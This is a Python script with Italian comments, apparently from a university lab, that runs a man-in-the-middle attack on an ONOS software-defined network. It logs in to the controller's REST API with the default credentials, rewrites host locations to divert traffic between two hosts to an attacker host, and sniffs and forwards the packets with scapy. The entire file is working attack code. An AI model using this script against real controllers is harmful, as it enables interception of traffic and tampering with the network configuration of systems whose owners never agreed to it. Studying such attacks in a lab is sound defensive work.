#!/usr/bin/python3
import scapy.all as scapy
import requests
from requests.auth import HTTPBasicAuth


"""-------------------- sezione variabili di utilità --------------------"""

# Indirizzi IP degli host che ci interessano ai fini dell'attacco
H1_IP = "10.0.0.1"
H3_IP = "10.0.0.3"
H1_MAC = "00:00:00:00:00:01"
H2_MAC = "00:00:00:00:00:02"
H3_MAC = "00:00:00:00:00:03"

# Interfaccia di rete su H2
INTERFACE = "h2-eth0"

packets_buffer = []

ONOS_USERNAME = "onos"
ONOS_PASSWORD = "rocks"

url_configurazione_hosts = "http://172.17.0.2:8181/onos/v1/network/configuration/hosts/"


mac_ips = {"00:00:00:00:00:01": "10.0.0.1", "00:00:00:00:00:03": "10.0.0.3", "00:00:00:00:00:02": "10.0.0.2"}
locations = ["of:0000000000000001/1", "of:0000000000000002/3"]

"""-------------------- fine sezione variabili di utilità --------------------"""


# Sostituisce la location dell'host vittima con quella desiderata dall'attaccante
def scambia_location(mac):
    payload_hosts = {
        f"{mac}/None": {
            "basic": {
                "ips": [mac_ips[mac]],
                "locations": ["of:0000000000000002/2"]
            }
        }
    }

    # invio = time.time()
    risposta = requests.post(url_configurazione_hosts, auth=HTTPBasicAuth(ONOS_USERNAME, ONOS_PASSWORD),
                             headers={'Content-Type': 'application/json'}, json=payload_hosts)

    if risposta.status_code == 200:
        # print(f"> {time.time() - invio: .3f} ms")
        print(f"La location di {mac_ips[mac]} è stata modificata\n")


# Ripristina la location dell'host vittima, rimettendolo sulla porta dello switch originaria
def ripristina_location(mac):
    posizione_locations = list(mac_ips.keys()).index(mac)

    payload_hosts = {
        f"{mac}/None": {
            "basic": {
                "ips": [mac_ips[mac]],
                "locations": [locations[posizione_locations]]
            }
        }
    }
    risposta = requests.post(url_configurazione_hosts, auth=HTTPBasicAuth(ONOS_USERNAME, ONOS_PASSWORD),
                             headers={'Content-Type': 'application/json'}, json=payload_hosts)
    if risposta.status_code == 200:
        print(f"La location di {mac_ips[mac]} è stata ripristinata\n")


# Elimina ogni configurazione di rete aggiunta
def elimina_hosts():
    # Cancella Configurazioni di rete (Hosts, Links, Devices etc)
    url_hosts_alt = "http://172.17.0.2:8181/onos/v1/network/configuration/hosts/"
    risposta = requests.delete(url_hosts_alt, auth=HTTPBasicAuth(ONOS_USERNAME, ONOS_PASSWORD))

    if risposta.status_code == 204:
        print(f"La topologia è stata ripristinata\n")


def packet_callback(packet):
    if packet not in packets_buffer:
        packets_buffer.append(packet)
        if ((packet[scapy.Ether].dst == H3_MAC and packet[scapy.Ether].src == H1_MAC) or
                (packet[scapy.Ether].dst == H1_MAC and packet[scapy.Ether].src == H3_MAC)):  # MAC di h3

            print(f"Pacchetto: {packet[scapy.IP].src} --> {packet[scapy.IP].dst} intercettato da 10.0.0.2\n")
            ripristina_location(packet[scapy.Ether].dst)  # Ripristina la porta originale del destinatario
            scambia_location(packet[scapy.Ether].src)
            scapy.sendp(packet, iface=INTERFACE, verbose=False)  # Invia i pacchetti tramite l'interfaccia di h2
            print(f"Pacchetto inoltrato ad {packet[scapy.IP].dst}\n\n{'-' * 75}\n")


def start_sniffing():
    scapy.sniff(iface=INTERFACE, prn=packet_callback, filter="ip")


if __name__ == "__main__":
    scambia_location(H3_MAC)  # Modifica la porta di h3 a quella di h2
    start_sniffing()
    ripristina_location(H1_MAC)
    ripristina_location(H3_MAC)
    elimina_hosts()
